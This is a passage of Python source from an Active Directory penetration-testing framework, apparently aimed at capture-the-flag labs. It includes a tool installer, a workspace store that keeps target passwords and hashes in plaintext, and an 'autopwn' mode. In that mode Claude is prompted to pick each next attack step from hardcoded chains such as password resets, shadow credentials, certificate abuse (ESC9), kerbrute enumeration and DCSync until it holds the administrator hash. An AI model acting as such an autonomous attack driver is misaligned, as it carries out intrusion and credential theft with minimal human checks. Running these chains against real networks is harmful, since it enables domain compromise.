                    rc = run_cmd(['bash', '-c', f'cd {dest} && {post_cmd}'])
                    if rc != 0: errors.append(f'post-install {name} failed')
                else:
                    log(f'{GREEN}ok{RESET}: {name}', 'success')
            # symlink scripts into tools/ root for easy PATH access
            for name, _, _, binary in git_missing:
                dest = os.path.join(_tools_base, name)
                for root, _, files in os.walk(dest):
                    if binary in files:
                        src = os.path.join(root, binary)
                        dst = os.path.join(_tools_base, binary)
                        if not os.path.exists(dst):
                            try: os.symlink(os.path.abspath(src), dst)
                            except Exception: pass
                        break
        else:
            log('git not found — skipping repos', 'warn')
    else:
        log('git: all repos present — skipping', 'success')

    # ── krb5.conf ─────────────────────────────────────────────────────────
    if krb5_missing:
        domain = TARGET.domain or ''
        dc     = TARGET.dc or ''
        if not domain or not dc:
            log(f'{ORANGE}krb5.conf{RESET}: run {C0}set{RESET} first to configure domain + DC, then re-run {C0}install{RESET}', 'warn')
            log(f'Or run {C0}clockskew sync{RESET} after {C0}set{RESET} — it will write krb5.conf automatically', 'info')
        if domain and dc:
            _write_krb5(TARGET)
        else:
            log('domain/DC not set — skipping krb5.conf (run: set, then install again)', 'warn')
    else:
        log('krb5.conf: already configured — skipping', 'success')

    hr()
    if errors:
        log(f'{len(errors)} error(s):', 'warn')
        for e in errors: log(f'  {RED}{e}{RESET}', 'warn')
    else:
        log('All missing dependencies installed successfully', 'success')

    tools_dir = os.path.abspath('tools')
    log(f'Repos → {WHITE}{tools_dir}{RESET}', 'info')
    log(f'Add to PATH: {WHITE}export PATH=$PATH:{tools_dir}{RESET}', 'info')
    log(f'Persist:     {WHITE}echo "export PATH=\\$PATH:{tools_dir}" >> ~/.zshrc{RESET}', 'info')

    # Windows binaries
    print(f'\n  {C0}{BOLD}windows binaries{RESET}  {GREY}→ {win_dir}{RESET}')
    import urllib.request as _ur, zipfile as _zf, gzip as _gz, shutil as _sh
    for fname, url, ftype in WIN_BINS:
        dest = os.path.join(win_dir, fname)
        if os.path.exists(dest):
            print(f'  {GREEN}✓{RESET}  {fname:<35} {GREY}already present{RESET}')
            continue
        print(f'  {GREY}↓{RESET}  downloading {fname}...', end='', flush=True)
        try:
            tmp = dest + '.tmp'
            _ur.urlretrieve(url, tmp)
            if ftype == 'zip':
                with _zf.ZipFile(tmp) as z:
                    extracted = False
                    target_stem = fname.lower().replace('.exe','').replace('.ps1','')
                    # first pass — exact name match
                    for member in z.namelist():
                        mbase = member.split('/')[-1].lower()
                        if mbase == fname.lower():
                            with z.open(member) as src, open(dest,'wb') as dst:
                                _sh.copyfileobj(src, dst)
                            extracted = True; break
                    # second pass — stem match
                    if not extracted:
                        for member in z.namelist():
                            mbase = member.split('/')[-1].lower()
                            if target_stem in mbase and (mbase.endswith('.exe') or mbase.endswith('.ps1')):
                                with z.open(member) as src, open(dest,'wb') as dst:
                                    _sh.copyfileobj(src, dst)
                                extracted = True; break
                    # third pass — any exe
                    if not extracted:
                        for member in z.namelist():
                            mbase = member.split('/')[-1]
                            if mbase.endswith('.exe') or mbase.endswith('.ps1'):
                                out_path = os.path.join(win_dir, mbase)
                                with z.open(member) as src, open(out_path,'wb') as dst:
                                    _sh.copyfileobj(src, dst)
                os.remove(tmp)
            elif ftype == 'gz':
                with _gz.open(tmp,'rb') as src, open(dest,'wb') as dst:
                    _sh.copyfileobj(src, dst)
                os.remove(tmp)
            else:
                os.rename(tmp, dest)
            print(f'  {GREEN}done{RESET}')
        except Exception as e:
            print(f'  {RED}failed: {e}{RESET}')
            try:
                if os.path.exists(tmp): os.remove(tmp)
            except: pass
    print(f'\n  {GREY}Tip — upload in evil-winrm: {WHITE}upload {win_dir}/<tool.exe>{RESET}')
    hr()

CMDS = sorted(list(MODULES.keys()) + ['check','tools',
    'set','pivot','workspace','ws','target','modules','run','loot','report',
    'flag','flags','tgt','hint','h','explain','ex','autopwn','ap','b64get','healthcheck','db',
    'clockskew','install','clear','exit','quit','q','help','?',
    'history','search',
    'hivemind','hivemind upload','sccm','trusts','aclscan','adcskiller','grouper2','aclight','lsassy','bh-view','snaffler','pywsus','export','import','targets','smbclientng','powerview',
])

def _get_workspaces():
    """Get list of workspace names from disk."""
    ws_dir = os.path.expanduser('~/.segfault-ad/workspaces')
    if not os.path.isdir(ws_dir): return []
    return sorted([d for d in os.listdir(ws_dir)
                   if os.path.isdir(os.path.join(ws_dir, d))])


def ad_completer(text, state):
    line  = readline.get_line_buffer()
    parts = line.split()

    # subcommand completion
    ws_names = _get_workspaces()
    subcmds = {
        'hivemind':  ['upload', 'status'],
        'ws':        ['new', 'load', 'list', 'save', 'delete'] + ws_names,
        'workspace': ['new', 'load', 'list', 'save', 'delete'] + ws_names,
        'bloody':    ['resetpwd','addtogroup','dcsync-rights','adduser','addself',
                      'writeowner','genericall','setrbcd','enableaccount'],
        'exec':      ['winrm','smb','ssh'],
        'relay':     ['smb','ldap','adcs','socks'],
        'certipy':   ['find','esc1','esc4','esc6','esc7','esc8','shadow','forge','auth'],
        'nxcmodules':['rid','users','shares','spider','pass-pol','loggedon'],
        'adrecon':   ['All','DCOnly','LoggedOn','Session','Acl'],
        'powerview':  ['interactive','users','groups','acl','spns','asrep','trusts',
                       'computers','gpo','ca','shadow','rbcd','vuln','recon'],
        'smbclientng':['interactive','command','shares','spider'],
        'mssql':     ['enum','hash','linked','cmd','privesc'],
        'shares':    ['auto','manual','spider'],
        'certipy':   ['find','esc1','esc4','esc6','esc7','esc8','shadow','forge','auth'],
        'dcsync':    ['all','user'],
        'sliver':    [],
        'pathpwn':   [],
        'aclscan':   ['current','principal','file','extends'],
        'trusts':    ['enum','sidhistory','golden','crossforest'],
        'sccm':      ['enum','naa','dpapi','pxe','admin'],
        'lsassy':    ['comsvcs','procdump','dumpert'],
    }

    # ws load/delete <TAB> → show workspace names
    if len(parts) >= 2:
        cmd = parts[0].lower()
        sub = parts[1].lower() if len(parts) > 1 else ''
        # ws load/delete → complete with workspace names
        if cmd in ('ws','workspace') and sub in ('load','delete','save') and len(parts) >= 3:
            m = [w for w in ws_names if w.startswith(text)]
            return m[state] if state < len(m) else None
        if cmd in subcmds:
            m = [s for s in subcmds[cmd] if s.startswith(text)]
            return m[state] if state < len(m) else None

    # top-level command completion
    m = [c for c in CMDS if c.startswith(text)]

    # file path completion
    if not m and ('/' in text or text.startswith('~')):
        import glob as _glc
        expanded = os.path.expanduser(text)
        paths = _glc.glob(expanded + '*')
        m = [p + ('/' if os.path.isdir(p) else '') for p in paths]

    return m[state] if state < len(m) else None


readline.set_completer(ad_completer)
readline.parse_and_bind('tab: complete')

# =============================================================================
# WORKSPACE MANAGEMENT
# =============================================================================
WORKSPACE_DIR = os.path.expanduser('~/.segfault-ad/workspaces')

def _ws_path(name): return os.path.join(WORKSPACE_DIR, name)
def _ws_config(name): return os.path.join(_ws_path(name), 'target.ini')
def _ws_notes(name): return os.path.join(_ws_path(name), 'notes.txt')

def list_workspaces():
    os.makedirs(WORKSPACE_DIR, exist_ok=True)
    return sorted([d for d in os.listdir(WORKSPACE_DIR) if os.path.isdir(_ws_path(d))])

def save_workspace(name, target):
    ws_dir = _ws_path(name)
    os.makedirs(ws_dir, exist_ok=True)
    # each workspace gets its own loot dir inside the workspace folder
    ws_loot = os.path.join(ws_dir, 'loot')
    os.makedirs(ws_loot, exist_ok=True)
    cfg = configparser.ConfigParser()
    cfg['target'] = {}
    if target.domain:   cfg['target']['domain']   = target.domain
    if target.dc:       cfg['target']['dc']        = target.dc
    if target.dc_fqdn:  cfg['target']['dc_fqdn']  = target.dc_fqdn
    if target.user:     cfg['target']['username']  = target.user
    if target.password: cfg['target']['password']  = target.password
    if target.hash:     cfg['target']['hash']      = target.hash
    cfg['target']['loot_dir'] = ws_loot
    with open(_ws_config(name), 'w') as f: cfg.write(f)

def load_workspace(name, target):
    cfg_file = _ws_config(name)
    if not os.path.exists(cfg_file):
        log(f'Workspace {WHITE}{name}{RESET} not found','error'); return False
    cfg = configparser.ConfigParser()
    cfg.read(cfg_file)
    if 'target' in cfg:
        t = cfg['target']
        target.domain   = t.get('domain',   target.domain or '')
        target.dc       = t.get('dc',       target.dc or '')
        target.dc_fqdn  = t.get('dc_fqdn',  target.dc_fqdn or '')
        target.user     = t.get('username', target.user or '')
        target.password = t.get('password', '') or None
        target.hash     = t.get('hash',     '') or None
        # set workspace loot dir
        ws_loot = t.get('loot_dir', os.path.join(_ws_path(name), 'loot'))
        os.makedirs(ws_loot, exist_ok=True)
        target.loot_dir = ws_loot
        target.workspace_set = True
        if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
        _auto_load_ccache(target)
        _write_krb5(target)
        # restore session state (attack map)
        _load_session_state()
        return True
    return False

def do_workspace(target):
    hr()
    workspaces = list_workspaces()
    print(f'  {C0}{BOLD}workspace{RESET}  {GREY}manage pentest targets{RESET}\n')
    actions = ['list','new','load','save','delete','notes']
    action = input_field('action', 'list', actions)

    if action == 'list':
        if not workspaces:
            log('No workspaces yet — create one with: workspace → new','info')
        else:
            print(f'\n  {GREY}{"name":<20} {"domain":<25} {"user":<20} {"dc"}{RESET}')
            print(f'  {GREY}{"─"*75}{RESET}')
            for ws in workspaces:
                cfg = configparser.ConfigParser(); cfg.read(_ws_config(ws))
                t   = cfg['target'] if 'target' in cfg else {}
                dom  = t.get('domain','─'); usr = t.get('username','─'); dc = t.get('dc','─')
                loot = t.get('loot_dir', os.path.join(_ws_path(ws),'loot'))
                n_files = len(os.listdir(loot)) if os.path.exists(loot) else 0
                active = f' {GREEN}◄ active{RESET}' if (target.domain and dom == target.domain and usr == target.user) else ''
                print(f'  {WHITE}{ws:<20}{RESET} {C0}{dom:<25}{RESET} {PINK}{usr:<15}{RESET} {GREY}{dc:<16}{RESET} {GREY}{n_files} loot files{RESET}{active}')
            print()

    elif action == 'new':
        name = input_field('workspace name')
        if not name: log('Name required','error'); hr(); return
        if name in workspaces:
            log(f'Workspace {WHITE}{name}{RESET} already exists — loading it','warn')
            if load_workspace(name, target):
                log(f'Loaded {WHITE}{name}{RESET}','success')
        else:
            os.makedirs(_ws_path(name), exist_ok=True)
            log(f'Created workspace {WHITE}{name}{RESET} — run {C0}set{RESET} to configure target','success')
            # clear session state for fresh start
            global _SESSION_RESULTS
            _SESSION_RESULTS = []
            if target.domain:
                copy = input_field(f'copy current target ({target.domain}) into workspace?','y',['y','n'])
                if copy == 'y':
                    save_workspace(name, target)
                    log(f'Target saved to workspace {WHITE}{name}{RESET}','success')

    elif action == 'load':
        if not workspaces: log('No workspaces found','error'); hr(); return
        name = input_field('workspace name', workspaces[0], workspaces)
        if load_workspace(name, target):
            log(f'Loaded {WHITE}{name}{RESET}: {C0}{target.domain}{RESET} / {C0}{target.user or "no user"}{RESET} @ {C0}{target.dc}{RESET}','success')
            log(f'Loot dir: {WHITE}{target.loot_dir}{RESET}','info')

    elif action == 'save':
        name = input_field('workspace name', target.domain.split('.')[0] if target.domain else 'default')
        if not name: log('Name required','error'); hr(); return
        save_workspace(name, target)
        log(f'Saved to workspace {WHITE}{name}{RESET}','success')

    elif action == 'delete':
        if not workspaces: log('No workspaces found','error'); hr(); return
        name = input_field('workspace to delete','',workspaces)
        ws_dir = _ws_path(name)
        loot_link = os.path.join(ws_dir, 'loot')
        real_loot = os.readlink(loot_link) if os.path.islink(loot_link) else None
        log(f'Will delete: {WHITE}{ws_dir}{RESET} (config + notes + loot symlink)','warn')
        if real_loot:
            log(f'Loot files at {WHITE}{real_loot}{RESET} will NOT be deleted','info')
        confirm = input_field(f'delete workspace {name} and all contents?','n',['y','n'])
        if confirm == 'y':
            import shutil as _sh
            _sh.rmtree(ws_dir, ignore_errors=True)
            log(f'Deleted workspace {WHITE}{name}{RESET}','success')

    elif action == 'notes':
        if not workspaces: log('No workspaces found','error'); hr(); return
        name = input_field('workspace name', workspaces[0], workspaces)
        note_file = _ws_notes(name); os.makedirs(_ws_path(name), exist_ok=True)
        note = input_field('add note (blank to view)','')
        if note:
            import datetime as _dt
            with open(note_file,'a') as f:
                f.write(f'[{_dt.datetime.now().strftime("%Y-%m-%d %H:%M")}] {note}\n')
            log('Note saved','success')
        elif os.path.exists(note_file):
            print(f'\n{open(note_file, errors='replace').read()}')
        else:
            log('No notes yet','info')
    hr()



# =============================================================================
# AI COMMANDS — hint, explain, autopwn via Claude API
# =============================================================================
def _claude_ask(prompt, system=None, max_tokens=1000):
    """Call Claude API and return response text."""
    api_key = os.environ.get('ANTHROPIC_API_KEY','')
    if not api_key:
        return ("[No API key — set: export ANTHROPIC_API_KEY=sk-ant-...\n"
                " Get one at: console.anthropic.com]")
    try:
        import urllib.request, json as _json
        data = {
            "model": "claude-sonnet-4-6",
            "max_tokens": max_tokens,
            "messages": [{"role": "user", "content": prompt}]
        }
        if system: data["system"] = system
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=_json.dumps(data).encode(),
            headers={
                "Content-Type": "application/json",
                "x-api-key": api_key,
                "anthropic-version": "2023-06-01"
            },
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = _json.loads(resp.read())
            return result["content"][0]["text"]
    except Exception as e:
        return f"[AI error: {e}]"

def do_hint(target):
    """hint — paste error/situation, Claude suggests next steps."""
    hr()
    log(f'{C0}AI Hint{RESET} — describe your situation or paste an error','info')
    log(f'{GREY}Claude will suggest next attack steps','info')
    hr()
    print(f'  Current target: {C0}{target.domain}{RESET} / {C0}{target.user or "no user"}{RESET}')
    print(f'  Paste your error or situation (type END on a new line when done):')
    lines = []
    while True:
        try:
            line = input()
            if line.strip().upper() == 'END': break
            lines.append(line)
        except EOFError: break
    situation = '\n'.join(lines)
    if not situation.strip(): hr(); return

    context = f"""You are an expert Active Directory penetration tester assistant.
Current target: domain={target.domain}, dc={target.dc}, user={target.user or 'none'}, 
creds={'password' if target.password else 'hash' if target.hash else 'none'}.
Available tools: certipy, bloodyad, impacket, netexec, kerbrute, PKINITtools, pywhisker.
Be concise and practical. Give specific commands to run next."""

    log('Asking Claude...','info')
    response = _claude_ask(f"AD pentest situation:\n{situation}\n\nWhat should I do next? Give specific commands.", system=context)
    hr()
    print(f'\n{response}\n')
    hr()

def do_explain(target):
    """explain — explain a BloodHound edge, ACE, or AD concept."""
    hr()
    log(f'{C0}AI Explain{RESET} — explain any AD/BloodHound concept','info')
    hr()
    term = input_field('what to explain (e.g. ESC13, GenericWrite, Kerberoast)','')
    if not term: hr(); return

    context = """You are an expert Active Directory security researcher.
Explain concepts clearly and concisely. Include:
1. What it is
2. Why it matters for pentesting
3. How to exploit it (with specific tools/commands)
Keep it under 300 words."""

    log('Asking Claude...','info')
    response = _claude_ask(f"Explain this AD/security concept for a pentester: {term}", system=context)
    hr()
    print(f'\n{response}\n')
    hr()

def do_autopwn(target):
    """autopwn — fully automated attack chain execution with AI guidance."""
    hr()
    log(f'{C0}{BOLD}AI AutoPwn{RESET} — automated attack chain execution','info')
    log(f'{ORANGE}This will actively attack the target — use only on authorized systems{RESET}','warn')
    hr()
    # warn if stale loot exists
    import glob as _gl
    stale = _gl.glob(os.path.join(target.loot_dir,'*.ccache'))
    if stale:
        log(f'{ORANGE}Stale ccaches detected in loot — may cause autopwn to skip steps{RESET}','warn')
        wipe = input_field('wipe loot dir for clean start?','y',['y','n'])
        if wipe == 'y':
            import shutil as _sh_ap
            for f in _gl.glob(os.path.join(target.loot_dir,'*')):
                try:
                    if os.path.isfile(f): os.remove(f)
                    elif os.path.isdir(f): _sh_ap.rmtree(f)
                except Exception: pass
            log('Loot dir wiped — starting clean','success')
    confirm = input_field('start automated attack chain?','n',['y','n'])
    if confirm != 'y': hr(); return

    def _status():
        """Get current pentest status summary.""",
        ccaches = [os.path.basename(f).replace('.ccache','') for f in _gl.glob(os.path.join(target.loot_dir,'*.ccache'))]
        cracked = open(os.path.join(target.loot_dir,'cracked.txt')).read().splitlines() if os.path.exists(os.path.join(target.loot_dir,'cracked.txt')) else []
        users_f = open(os.path.join(target.loot_dir,'users.txt')).read().splitlines() if os.path.exists(os.path.join(target.loot_dir,'users.txt')) else []
        try:
            data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
        except Exception:
            data = {'users':[],'groups':[],'computers':[]}
        bh_users = [u.get('Properties',{}).get('name','').split('@')[0] for u in data['users']][:30]
        bh_groups = [g.get('Properties',{}).get('name','').split('@')[0] for g in data['groups']][:30]
        # check for ADCS — certipy find output
        adcs_found = os.path.exists(os.path.join(target.loot_dir,'certipy_find.txt'))
        esc_found = []
        cf = os.path.join(target.loot_dir,'certipy_find.txt')
        if adcs_found:
            esc_found = re.findall(r'ESC\d+', open(cf, errors='replace').read())
        # only show bh_users if we have creds — otherwise it confuses Claude into skipping webscrape
        if not target.user:
            bh_users = []
            bh_groups = []
        # check for web service — try DC IP and FQDN
        web_url = None
        try:
            import urllib.request as _ur3
            hosts_to_try = [target.dc]
            if target.dc_fqdn: hosts_to_try.append(target.dc_fqdn)
            for host in hosts_to_try:
                for proto in ['http','https']:
                    try:
                        r = _ur3.urlopen(f'{proto}://{host}', timeout=3)
                        web_url = f'{proto}://{host}'
                        break
                    except Exception: pass
                if web_url: break
        except Exception: pass

        # check if cracked creds differ from current user — needs pivot
        needs_pivot = False
        pivot_to = None
        for line in cracked:
            if ':' in line and not line.startswith('$'):
                parts = line.split(':',1)
                if parts[0].strip().lower() != (target.user or '').lower():
                    needs_pivot = True
                    pivot_to = f"{parts[0].strip()}:{parts[1].strip()}"
                    break

        return {
            'domain': target.domain, 'dc': target.dc,
            'current_user': target.user or 'none',
            'has_password': bool(target.password),
            'has_hash': bool(target.hash),
            'has_creds': bool(target.password or target.hash),
            'creds_summary': f'{target.user}:{target.password}' if target.password else (f'{target.user}:hash_set' if target.hash else 'none'),
            'ccaches': ccaches, 'cracked': cracked,
            'known_users': users_f[:30],
            'bh_users': bh_users, 'bh_groups': bh_groups,
            'loot_dir': target.loot_dir,
            'web_url': web_url or 'none',
            'needs_pivot': needs_pivot,
            'pivot_to': pivot_to or 'none',
            'adcs_found': adcs_found if 'adcs_found' in dir() else False,
            'esc_vulns': esc_found if 'esc_found' in dir() else []
        }

    def _ask_claude_next(status, history):
        """Ask Claude what to do next given current status."""
        import json as _jc
        context = """You are an AI pentester running an automated AD attack chain. Be fast. No unnecessary steps.

RESPOND WITH JSON ONLY — no markdown, no explanation:
{"reasoning": "one line", "action": "module_name", "params": {}, "done": false}

━━━ ABSOLUTE RULES (never break these) ━━━
1. has_creds=true → NEVER run unauth/kerbrute/enum/spray — you have creds, use them
2. 'administrator' in cracked → NEXT ACTION IS flag, nothing else, set done=true after
3. NEVER repeat an action already in history — move to next step
4. adrecon runs ONCE — if bh_users populated, skip it
5. certipy find runs ONCE — if ESC in history, skip it
6. No dcsync/exec/pathfind when you already have administrator hash — go to flag
7. If history has 'DONE: have administrator hash' → action=flag, done=true

━━━ CHAIN SELECTION ━━━
Look at bh_users in status. Pick the matching chain and follow it step by step.

CHAIN A — CERTIFIED/ESC9 (assume-breach, creds given, WriteOwner on Management group):
  IMPORTANT: prep_group MUST run as the initial assume-breach user (judith.mader) — NOT after pivoting.
  If current user is NOT the initial user, check history for shadowcred and continue from there.
  1  adrecon          — skip if bh_users already populated
  2  kerberoast       — grab any TGS hashes as initial user
  3  prep_group       {"group":"Management","member":"<initial_user>"} — ONLY as initial assume-breach user
  4  shadowcred       {"target":"management_svc"} — needs Management membership from step 3
  5  [auto-pivot to management_svc — do NOT add pivot action]
  6  bloody           {"action":"resetpwd","user":"ca_operator","password":"Passw0rd123!"} — as management_svc (has GenericAll on ca_operator)
  7  [auto-pivot to ca_operator — do NOT add pivot action]
  8  certipy          {"action":"find"} — as ca_operator, will find ESC9
  9  certipy          {"action":"esc9","ca":"certified-DC01-CA","template":"CertifiedAuthentication",
                       "gw_user":"management_svc","gw_hash":"<hash from step 4>",
                       "ca_user":"ca_operator","ca_pass":"Passw0rd123!"}
  10 dcsync           — dump all hashes with administrator ccache
  11 flag             done=true

CHAIN B — SAUNA/AS-REP (svc_loanmgr OR no creds yet):
  1  webscrape        — if web_url set and users unknown
  2  asreproast       — after users discovered
  3  hashcrack        — after hashes captured
  4  [auto-pivot]
  5  adrecon
  6  exec             {"method":"winrm"}
  7  winlogon         — grab creds from registry
  8  [auto-pivot to svc account]
  9  dcsync
  10 flag             done=true

CHAIN D — REDELEGATE/FTP+KeePass+Delegation (FTP open, no initial creds):
  1  ftp              {"action":"download"} — get kdbx and txt files
  2  keepass          {"action":"both"} — crack kdbx, extract creds
  3  mssql            {"action":"enum","local_auth":"y","rid_brute":"y"} — get domain users
  4  spray            {"password":"<from keepass>"} — find valid user
  5  tgt              — get kerberos ticket
  6  adrecon          — collect bloodhound data
  7  pathfind         — find attack path
  8  bloody           {"action":"resetpwd","user":"<target>","password":"Passw0rd123!"}
  9  exec             {"method":"winrm"} — get shell
  10 bloody           {"action":"resetpwd","user":"FS01$","password":"Passw0rd123!"} — control computer account
  11 delegation       {"action":"attack","setup":"y","exec_user":"<HelpDesk user>","deleg_acct":"FS01$","spn":"cifs/dc.<domain>","impersonate":"<non-protected user>"}
  12 flag             done=true

CHAIN E — TIMEROAST (no creds, machine accounts accessible via NTP):
  1  timeroast        — extract machine account hashes via NTP
  2  hashcrack        — crack timeroast hashes
  3  [auto-pivot to cracked machine account]
  4  tgt              — get kerberos ticket
  5  adrecon          — collect bloodhound data
  6  pathfind         — find attack path via ACLs
  7  bloody + exec chain based on pathfind output
  8  flag             done=true


  1  adrecon
  2  certipy          {"action":"find"}
  3  certipy          {"action":"esc1","ca":"<CA>","template":"<tmpl>"}
  4  flag             done=true

━━━ AVAILABLE PARAMS ━━━
adrecon: {"collection":"All"}
prep_group: {"group":"Management","member":"<user>"}
shadowcred: {"target":"<user>"}
certipy: {"action":"find|esc1|esc9","ca":"","template":"","mgmt_user":"","mgmt_hash":"","ca_user":"","ca_hash":""}
dcsync: {"user":"administrator"}
exec: {"method":"winrm|wmiexec"}
flag: {}
webscrape: {"url":"<url>"}
asreproast: {}
hashcrack: {}
winlogon: {}"""

        # detect which chain step we're on from history
        chain_step = len([h for h in history if h.strip().startswith('  ') and 'failed' not in h.lower()])
        admin_done = any('administrator hash' in h or 'DONE: have administrator' in h for h in history)
        has_admin_hash = any('administrator' in h and 'hash=' in h for h in history)
        has_admin_done = admin_done or has_admin_hash
        admin_warning = '⚠️  ADMINISTRATOR HASH IN HAND — action MUST be flag, done=true' if has_admin_done else ''

        prompt = f"""STATUS:
{_jc.dumps(status, indent=2)}

HISTORY (last 12 steps):
{chr(10).join(history[-12:]) if history else 'none'}

CHAIN PROGRESS: step {chain_step} completed
ADMIN HASH OBTAINED: {has_admin_done}
{admin_warning}

What is the single best NEXT action? JSON only:"""
        response = _claude_ask(prompt, system=context, max_tokens=500)
        try:
            # strip markdown if present
            response = response.strip()
            if '```' in response:
                response = response.split('```')[1]
                if response.startswith('json'): response = response[4:]
            # find JSON object in response
            m = re.search(r'\{.*\}', response, re.DOTALL)
            if m: response = m.group(0)
            return _jc.loads(response)
        except Exception:
            return {'reasoning':'parse error — skipping step','action':'skip','params':{},'done':False}

    # ── main autopwn loop ──────────────────────────────────────────────────────
    history = []
    import time as _ap_time
    _ap_start = _ap_time.time()
    _AP_MAX_STEPS   = 50    # hard cap — prevents infinite loops
    _AP_MAX_MINUTES = 30    # wall clock safety net
    _ap_consecutive_fails = 0
    step = 0

    while True:
        step += 1
        # safety nets
        if step > _AP_MAX_STEPS:
            log(f'AutoPwn: reached {_AP_MAX_STEPS} step limit','warn'); break
        if (_ap_time.time() - _ap_start) > _AP_MAX_MINUTES * 60:
            log(f'AutoPwn: {_AP_MAX_MINUTES}min time limit reached','warn'); break
        if _ap_consecutive_fails >= 5:
            log('AutoPwn: 5 consecutive failures — stopping','error'); break

        hr()
        elapsed = int(_ap_time.time() - _ap_start)
        _em, _es = divmod(elapsed, 60)
        _elapsed_str = f'{_em}m {_es}s' if _em > 0 else f'{_es}s'
        log(f'{C0}AutoPwn Step {step}{RESET}  {GREY}({_elapsed_str} elapsed){RESET}','info')
        status = _status()

        # AUTO-PIVOT: if cracked creds differ from current user, pivot immediately
        if status.get('needs_pivot') and status.get('pivot_to') != 'none':
            pt = status['pivot_to'].split(':',1)
            if len(pt)==2 and pt[0] and pt[1]:
                # prefer administrator if available in cracked.txt
                _cf_path = os.path.join(target.loot_dir,'cracked.txt')
                if os.path.exists(_cf_path):
                    for _line in open(_cf_path, errors='replace').read().splitlines():
                        if ':' not in _line: continue
                        _u,_h = _line.split(':',1)
                        if _u.strip().lower() == 'administrator' and re.match(r'^[a-fA-F0-9]{32}$',_h.strip()):
                            pt = ['administrator', _h.strip()]
                            break
                new_user = pt[0].strip()
                new_cred = pt[1].strip()
                target.user = new_user
                # detect if it's an NT hash (32 hex chars) or a password
                if re.match(r'^[a-fA-F0-9]{32}$', new_cred):
                    target.hash = new_cred
                    target.password = None
                    log(f'{GREEN}AUTO-PIVOT → {WHITE}{new_user}{RESET} (hash)','success')
                else:
                    target.password = new_cred
                    target.hash = None
                    log(f'{GREEN}AUTO-PIVOT → {WHITE}{new_user}:{new_cred}{RESET}','success')
                if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
                history.append(f'  auto-pivoted to {new_user}')
                add_result('pivot', f'→ {new_user} (auto)')
                status = _status()  # refresh status

        log(f'Asking Claude for next action...','info')
        decision = _ask_claude_next(status, history)

        action = decision.get('action','done')
        params = decision.get('params',{})
        reasoning = decision.get('reasoning','')
        done = decision.get('done', False)

        # highlight key terms in Claude's reasoning
        hl = reasoning
        # highlight usernames (word before : or @ or common patterns)
        hl = re.sub(r'([a-z][a-z0-9_\.]{1,20}:[A-Za-z0-9!@#$%^&*]{4,})',
                        lambda m: f'{PINK}{m.group(1)}{RESET}', hl)
        # highlight user@domain
        hl = re.sub(r'([a-zA-Z0-9\._-]+@[a-zA-Z0-9\._-]+\.[a-zA-Z]{2,})',
                        lambda m: f'{PINK}{m.group(1)}{RESET}', hl)
        # highlight IP addresses
        hl = re.sub(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
                        lambda m: f'{C0}{m.group(1)}{RESET}', hl)
        # highlight module names in backticks or quotes
        hl = re.sub(r'`([^`]+)`', lambda m: f'{WHITE}{m.group(1)}{RESET}', hl)
        # highlight key AD terms
        for term in ['Domain Admin','DCSync','AS-REP','Kerberoast','BloodHound',
                     'winlogon','WinRM','NTLM','Kerberos','GenericAll','WriteDACL',
                     'shadow credentials','ADCS','ESC1','ESC4','svc_loanmgr',
                     'Administrator','fsmith','Domain Admins']:
            hl = hl.replace(term, f'{ORANGE}{term}{RESET}')
        log(f'{GREEN}Claude says:{RESET} {hl}','info')
        log(f'{WHITE}Action: {action}{RESET}  params: {params}','info')

        history.append(f'Step {step}: {action} params={params}')

        _ap_consecutive_fails = 0  # reset on any handled action
        # execute the action FIRST
        try:
            if action == 'unauth':
                # run with output monitoring — stop kerbrute if hash found
                unauth_action = params.get('action','all')
                if unauth_action == 'all':
                    # run signing check first
                    Unauth().run(target) if False else None
                    # run kerbrute with early exit on hash found
                    kb = check_tool('kerbrute')
                    if kb:
                        default_wl = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
                        uf = os.path.join(target.loot_dir,'users.txt')
                        out_f = os.path.join(target.loot_dir,'kerbrute_users.txt')
                        cmd_kb = [kb,'userenum','-d',target.domain,
                                  '--dc',target.dc, default_wl,'-o',out_f]
                        proc = subprocess.Popen(cmd_kb, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)
                        hash_found = False
                        valid_users = []
                        for line in proc.stdout:
                            print(f'  {GREY}{line.rstrip()}{RESET}')
                            if 'VALID USERNAME' in line:
                                u = re.search(r'VALID USERNAME:\s+(\S+)@', line)
                                if u: valid_users.append(u.group(1))
                            if 'no pre auth required' in line or '$krb5asrep$' in line:
                                hash_found = True
                                log(f'{GREEN}Hash found! Stopping kerbrute...{RESET}','success')
                                proc.terminate()
                                break
                        proc.wait()
                        if valid_users:
                            uf_path = os.path.join(target.loot_dir,'users.txt')
                            existing = open(uf_path, errors='replace').read().splitlines() if os.path.exists(uf_path) else []
                            new_u = [u for u in valid_users if u not in existing]
                            if new_u:
                                with open(uf_path,'a') as _f: _f.write('\n'.join(new_u)+'\n')
                        if hash_found:
                            history.append(f'  Found AS-REP hash via kerbrute — stopping early')
                else:
                    m = Unauth(); m.run(target)
            elif action == 'asreproast':
                uf = os.path.join(target.loot_dir,'users.txt')
                m = ASREPRoast()
                m.answers = {'user list (blank = auth enum)': uf if os.path.exists(uf) else ''}
                m.run(target)
                # check if hashes were found
                hf = os.path.join(target.loot_dir,'asreproast_hashes.txt')
                if os.path.exists(hf):
                    hs = [l for l in open(hf, errors='replace').read().splitlines() if '$krb5asrep$' in l]
                    if hs:
                        history.append(f'  asreproast: found {len(hs)} hash(es) — crack next!')
                    else:
                        history.append(f'  asreproast: no hashes found — users not valid or preauth required')
                else:
                    history.append(f'  asreproast: no hash file — no valid users')
            elif action == 'kerberoast':
                m = Kerberoast(); m.answers = {}; m.run(target)
            elif action == 'skip':
                log('Parse error — skipping this step','warn')
                history.append('  skip: parse error on previous AI response')
            elif action == 'enum':
                m = Enum(); m.answers = {'scope':'all'}; m.run(target)
            elif action == 'adrecon':
                m = ADRecon(); m.answers = {'collection':'All'}; m.run(target)
            elif action == 'hashcrack':
                m = HashCrack(); m.answers = {'auto':'1'}; m.run(target)
            elif action == 'dcsync':
                m = DCSync(); m.answers = {}; m.run(target)
            elif action == 'webscrape':
                url = params.get('url', f'http://{target.dc}')
                pattern = params.get('pattern','names')
                log(f'Scraping {WHITE}{url}{RESET} for {pattern}...','info')
                try:
